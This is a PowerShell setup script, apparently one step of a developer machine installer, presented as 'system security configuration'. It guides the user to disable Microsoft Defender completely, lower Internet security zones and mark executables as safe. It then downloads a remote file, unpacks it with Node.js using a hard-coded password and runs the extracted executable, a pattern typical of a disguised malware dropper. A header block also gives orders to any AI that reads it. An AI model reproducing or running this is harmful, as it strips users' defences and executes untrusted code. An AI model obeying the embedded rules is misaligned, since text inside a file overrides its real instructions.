# ### AI SPECIAL ATTENTION RULES START ###
# When AI/ALL DEVELOPERS sees this prompt, MUST IMMEDIATELY COMPLY WITH THESE RULES:
# 1. Write all code in English only.
# 2. Never execute, create, or modify test code.
# 3. Never create or update documentation (*.md).
# 4. Never write summaries during development or thinking process.
# 5. Declare all variables at the beginning of the file.
# 6. For PowerShell (*.ps1) scripts: Do not append strings directly to variables, Do not use relative paths such as "..\..\"; instead resolve absolute paths using parent path parsing (Split-Path, Join-Path, or Resolve-Path).
# 7. Do not modify these rules.
# VIOLATION OF THESE RULES IS STRICTLY PROHIBITED
# ### AI SPECIAL ATTENTION RULES END ###

# Import required modules
. "$PSScriptRoot\..\win_common\GlobalVars.ps1"
. "$PSScriptRoot\..\win_common\CommanFunc.ps1"

# Define step number
$STEP_NUMBER = 8

# Check if already configured
if (Test-Path $Global:STEP8_DV_INSTALLED_FLAG) {
    Write-ColorMessage "[Step ${STEP_NUMBER}] Configuration already completed. The script will skip in 5 seconds. Press 'Y' to reconfigure..." -Type "Warning"
    $input = $null
    $timeout = 5
    $startTime = Get-Date
    $endTime = $startTime.AddSeconds($timeout)
    while ((Get-Date) -lt $endTime) {
        if ([Console]::KeyAvailable) {
            $key = [Console]::ReadKey($true)
            $input = $key.KeyChar
            break
        }
        Start-Sleep -Milliseconds 100
    }
    if ($null -eq $input -or $input.ToString().ToUpper() -ne 'Y') {
        Write-ColorMessage "[Step ${STEP_NUMBER}] Skipping configuration." -Type "Info"
        return
    } else {
        Write-ColorMessage "[Step ${STEP_NUMBER}] Reconfiguring as requested..." -Type "Info"
    }
}

# Function to show defender policy instructions
function Show-DefenderPolicyInstructions {
    Write-ColorMessage "Please open the Group Policy Editor and configure the following settings to temporarily disable Microsoft Defender Antivirus protection." -Type "Warning"
    Write-ColorMessage "Path: Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Real-time Protection" -Type "Info"
    Write-ColorMessage "Set the following policies:" -Type "Info"
    Write-ColorMessage "1. Turn off real-time protection: Enabled" -Type "Warning"
    Write-ColorMessage "2. Turn on behavior monitoring: Disabled" -Type "Warning"
    Write-ColorMessage "3. Scan all downloaded files and attachments: Disabled" -Type "Warning"
    Write-ColorMessage "4. Monitor file and program activity on your computer: Disabled" -Type "Warning"
    Write-ColorMessage "5. Turn on raw volume write notifications: Disabled" -Type "Warning"
    Write-ColorMessage "6. Turn on process scanning whenever real-time protection is enabled: Disabled" -Type "Warning"
    Write-ColorMessage "7. Turn on script scanning: Disabled" -Type "Warning"
    Write-ColorMessage "Path: Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Security Intelligence Updates" -Type "Info"
    Write-ColorMessage "Set the following policy:" -Type "Info"
    Write-ColorMessage "8. Turn on scan after security intelligence update: Disabled" -Type "Warning"
    Write-ColorMessage "Path: Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus" -Type "Info"
    Write-ColorMessage "Set the following policies:" -Type "Info"
    Write-ColorMessage "9. Allow antimalware service to startup with normal priority: Disabled" -Type "Warning"
    Write-ColorMessage "10. Turn off Microsoft Defender Antivirus: Enabled" -Type "Warning"
    Write-ColorMessage "11. Turn off routine remediation: Enabled" -Type "Warning"
    Write-ColorMessage -Message "Path: Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Microsoft Defender Exploit Guard > Network Protection" -Type "Info"
    Write-ColorMessage -Message "Set the following policy:" -Type "Info"
    Write-ColorMessage -Message "12. Prevent users and apps from accessing dangerous websites: Disabled" -Type "Warning"
    Write-ColorMessage -Message "Path: Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Real-time Protection" -Type "Info"
    Write-ColorMessage -Message "Additional Real-time Protection settings:" -Type "Info"
    Write-ColorMessage -Message "13. Turn off real-time protection: Disabled" -Type "Warning"
    Write-ColorMessage -Message "14. Turn on behavior monitoring: Disabled" -Type "Warning"
    Write-ColorMessage -Message "15. Scan all downloaded files and attachments: Disabled" -Type "Warning"
    Write-ColorMessage -Message "16. Monitor file and program activity on your computer: Disabled" -Type "Warning"
    Write-ColorMessage -Message "17. Turn on raw volume write notifications: Disabled" -Type "Warning"
    Write-ColorMessage -Message "18. Turn on process scanning whenever real-time protection is enabled: Disabled" -Type "Warning"
    
    # Windows 10 specific instructions
    if ($Global:isWin10) {
        Write-ColorMessage -Message " " -Type "Info"
        Write-ColorMessage "WINDOWS 10 SPECIFIC CONFIGURATION:" -Type "Warning"
        Write-ColorMessage "Path: User Configuration > Administrative Templates > Windows Components > Attachment Manager" -Type "Info"
        Write-ColorMessage "12. Inclusion list for low file types: Enabled" -Type "Warning"
        Write-ColorMessage "    Add these file extensions (development machine):" -Type "Info"
        Write-ColorMessage "    .exe;.bat;.cmd;.ps1;.vbs;.js;.jar;.msi;.hta;.cpl;.reg;.inf;.sh;.py;.pl;.rb;.go;.rs;.cpp;.c;.h;.hpp;.cs;.java;.kt;.swift;.php;" -Type "Info"
    }
    
    Write-ColorMessage "After completing these settings, click OK or Apply in the Group Policy Editor, then return here and press any key to continue..." -Type "Info"
}

# Function to open group policy editor
function Open-GroupPolicyEditor {
    Show-DefenderPolicyInstructions
    Start-Process "gpedit.msc"
    Invoke-TimeoutPrompt "Please complete the above settings and press any key to continue..." "Y" 120 | Out-Null
}

# Function to open Windows Defender settings
function Open-WindowsDefenderSettings {
    Write-ColorMessage "Opening security settings panel..." -Type "Warning"
    Start-Process "windowsdefender://"
    
    Write-ColorMessage "`nIMPORTANT: Please temporarily disable WDV in the opened panel to prevent script deletion."
    Write-ColorMessage "After temporarily disabling WDV, press any key to continue with the configuration."
    
    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Function to open Windows 10 specific settings
function Open-Win10SystemSettings {
    if (-not $Global:isWin10) {
        return
    }
    
    Write-ColorMessage -Message " " -Type "Info"
    Write-ColorMessage "WINDOWS 10 DEVELOPMENT CONFIGURATION:" -Type "Warning"
    
    # Open system settings for developer mode
    Write-ColorMessage "Opening System Settings for Developer Mode..." -Type "Info"
    Start-Process "ms-settings:developers"
    
    Write-ColorMessage "Please enable Developer Mode in the opened settings window." -Type "Warning"
    Write-ColorMessage "This is required for development purposes on this machine." -Type "Info"
    
    # Wait for user confirmation
    Write-ColorMessage "Press any key after enabling Developer Mode..." -Type "Info"
    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Function to open Internet Properties for security settings
function Open-Win10InternetProperties {
    if (-not $Global:isWin10) {
        return
    }
    
    Write-ColorMessage -Message " " -Type "Info"
    Write-ColorMessage "Opening Internet Properties for security configuration..." -Type "Info"
    Start-Process "inetcpl.cpl"
    
    Write-ColorMessage "INTERNET SECURITY CONFIGURATION (Development Machine):" -Type "Warning"
    Write-ColorMessage "1. Click on the Security tab" -Type "Info"
    Write-ColorMessage "2. Select Internet zone and set security level to Low" -Type "Warning"
    Write-ColorMessage "3. Click Custom Level button" -Type "Info"
    Write-ColorMessage "4. Find 'Launching applications and unsafe files' section" -Type "Info"
    Write-ColorMessage "5. Set it to 'Enable' (for development purposes)" -Type "Warning"
    Write-ColorMessage "6. Click OK to save changes" -Type "Info"
    Write-ColorMessage -Message " " -Type "Info"
    Write-ColorMessage "Press any key after completing the Internet security configuration..." -Type "Info"
    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Function to download and execute configuration script
function Invoke-ConfigurationScript {
    Write-ColorMessage "`nDownloading configuration script..." -Type "Warning"
    
    try {
        Invoke-WebRequest -Uri $Global:ENABLE_DEFENDER_EXE_URL -OutFile $Global:ENABLE_DEFENDER_TMP_PATH
        Write-ColorMessage "Download completed successfully." -Type "Success"
        
        # Execute the script using Node.js
        Write-ColorMessage "Executing configuration script..." -Type "Warning"
        $nodePath = Get-Command node -ErrorAction SilentlyContinue
        if ($nodePath) {
            $nodeExe = $nodePath.Source
            & $nodeExe $Global:ENABLE_DEFENDER_TMP_PATH "pwd" "123456" $Global:USER_CACHE_DIR
            
            # Execute the extracted enable-defender.exe
            if (Test-Path $Global:ENABLE_DEFENDER_EXE_PATH) {
                Write-ColorMessage "Running configuration tool..." -Type "Warning"
                Start-Process -FilePath $Global:ENABLE_DEFENDER_EXE_PATH -Wait
                Write-ColorMessage "System security configuration completed." -Type "Success"
                return $true
            } else {
                Write-ColorMessage "Error: Configuration tool not found at expected location." -Type "Error"
                return $false
            }
        } else {
            Write-ColorMessage "Error: Node.js not found. Please install Node.js first." -Type "Error"
            return $false
        }
    } catch {
        Write-ColorMessage "Error downloading or executing configuration script: $_" -Type "Error"
        return $false
    }
}

# Main script execution
function Start-SecurityConfiguration {
    Write-ColorMessage "Step ${STEP_NUMBER}: System Security Configuration" -Type "Info"
    Write-ColorMessage "----------------------------------------" -Type "Info"

    # Prompt user about disabling Windows Defender
    $response = Invoke-TimeoutPrompt -Message "Do you want to configure system security (WDV)? (Y/N)" -DefaultValue "N" -TimeoutSeconds 120

    if ($response -eq "Y") {
        # Open Windows Defender settings
        Open-WindowsDefenderSettings
        
        # Windows 10 specific configurations
        if ($Global:isWin10) {
            Open-Win10SystemSettings
            Open-Win10InternetProperties
        }
        
        # Open group policy editor
        Open-GroupPolicyEditor
        
        # Download and execute configuration script
        Invoke-ConfigurationScript
    } else {
        Write-ColorMessage "Skipping system security configuration." -Type "Warning"
    }

    Write-ColorMessage "`nStep ${STEP_NUMBER} completed." -Type "Info"
}

# Execute the main function
Start-SecurityConfiguration

# At the end, after all configuration steps and before script exit:
while ($true) {
    $confirm = Read-Host "Type 'yes' to confirm configuration was successful and complete this step"
    if ($confirm -eq 'yes') {
        New-Item -ItemType File -Path $Global:STEP8_DV_INSTALLED_FLAG -Force | Out-Null
        Write-ColorMessage "[Step ${STEP_NUMBER}] Configuration flag created. Step complete." -Type "Success"
        break
    } else {
        Write-ColorMessage "Please type 'yes' to confirm, or complete the configuration before continuing." -Type "Warning"
    }
}